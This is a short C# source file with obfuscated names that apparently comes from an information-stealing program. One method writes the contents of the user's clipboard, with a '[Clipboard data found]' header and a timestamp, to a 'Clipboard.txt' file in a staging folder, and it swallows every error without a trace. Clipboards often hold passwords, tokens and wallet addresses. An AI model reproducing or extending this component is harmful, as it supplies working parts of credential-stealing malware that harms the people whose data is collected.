using System;
using System.IO;

internal class ab
{
	private static string a(string ie)
	{
		try
		{
			return DateTime.Now.ToString(ie);
		}
		catch
		{
			return null;
		}
	}

	public static void b(string ig)
	{
		try
		{
			File.WriteAllText(ig + "\\Clipboard.txt", "[Clipboard data found] - [" + a("MM.dd.yyyy - HH:mm:ss") + "]\r\n\r\n" + ac.a() + "\r\n\r\n");
		}
		catch
		{
		}
	}
}
